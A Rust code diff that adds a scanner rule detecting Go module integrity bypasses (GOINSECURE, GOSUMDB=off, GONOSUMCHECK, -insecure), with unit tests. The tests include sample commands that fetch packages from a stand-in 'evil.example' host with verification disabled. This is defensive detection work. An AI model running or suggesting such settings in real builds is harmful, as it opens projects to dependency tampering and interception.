@@ -11,6 +11,7 @@ pub fn rules() -> Vec<Rule> {
         sc_006(),
         sc_007(),
         sc_008(),
+        sc_009(),
     ]
 }
 
@@ -334,6 +335,37 @@ fn sc_008() -> Rule {
     }
 }
 
+fn sc_009() -> Rule {
+    Rule {
+        id: "SC-009",
+        name: "Go module integrity bypass",
+        description: "Detects Go toolchain settings that disable module checksum verification or allow insecure module fetches, enabling dependency tampering or MITM (MITRE T1195.001)",
+        severity: Severity::High,
+        category: Category::SupplyChain,
+        confidence: Confidence::Firm,
+        patterns: vec![
+            // Insecure (plaintext/unverified) module fetches
+            Regex::new(r"\bGOINSECURE\s*=").expect("SC-009: invalid regex"),
+            // Disabling the checksum database
+            Regex::new(r"\bGOSUMDB\s*=\s*off").expect("SC-009: invalid regex"),
+            Regex::new(r"\bGONOSUMCHECK\b|\bGONOSUMDB\b").expect("SC-009: invalid regex"),
+            // -insecure flag via GOFLAGS or `go get`
+            Regex::new(r"GOFLAGS\s*=\s*[^\n]*-insecure").expect("SC-009: invalid regex"),
+            Regex::new(r"go\s+get\s+[^\n]*-insecure").expect("SC-009: invalid regex"),
+        ],
+        exclusions: vec![
+            // Comment lines
+            Regex::new(r"^\s*#").expect("SC-009: invalid regex"),
+        ],
+        message: "Go module integrity bypass: checksum verification is disabled or insecure module fetches are allowed, enabling dependency tampering or MITM.",
+        recommendation: "Keep GOSUMDB enabled and never set GOINSECURE/GONOSUMCHECK or -insecure. Verify modules against the checksum database.",
+        fix_hint: Some(
+            "Remove GOINSECURE/GONOSUMCHECK/-insecure and GOSUMDB=off; fetch modules over HTTPS with checksum verification.",
+        ),
+        cwe_ids: &["CWE-494", "CWE-829", "CWE-319"],
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -504,5 +536,38 @@ mod tests {
         let content = include_str!("../../../tests/fixtures/rules/sc_003.txt");
         let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
         crate::assert_rule_snapshot!("sc_003", findings);
+    }
+
+    #[test]
+    fn test_sc_009_detects_go_integrity_bypass() {
+        let rule = sc_009();
+        let test_cases = vec![
+            // Malicious: disabled verification / insecure fetches
+            ("GOINSECURE=* go get evil.example/pkg", true),
+            ("GOSUMDB=off go build ./...", true),
+            ("go env -w GOFLAGS=-insecure", true),
+            ("go get -insecure evil.example/pkg", true),
+            ("export GONOSUMCHECK=1", true),
+            // Benign: default/secure Go settings
+            ("GOPROXY=https://proxy.golang.org go build", false),
+            ("GOSUMDB=sum.golang.org go build", false),
+            ("go get github.com/pkg/errors", false),
+            ("GOOS=linux GOARCH=amd64 go build", false),
+        ];
+
+        for (input, should_match) in test_cases {
+            let matched = rule.patterns.iter().any(|p| p.is_match(input));
+            let excluded = rule.exclusions.iter().any(|e| e.is_match(input));
+            let result = matched && !excluded;
+            assert_eq!(result, should_match, "SC-009: Failed for input: {}", input);
+        }
+    }
+
+    #[test]
+    fn snapshot_sc_009() {
+        let rule = sc_009();
+        let content = include_str!("../../../tests/fixtures/rules/sc_009.txt");
+        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
+        crate::assert_rule_snapshot!("sc_009", findings);
     }
 }
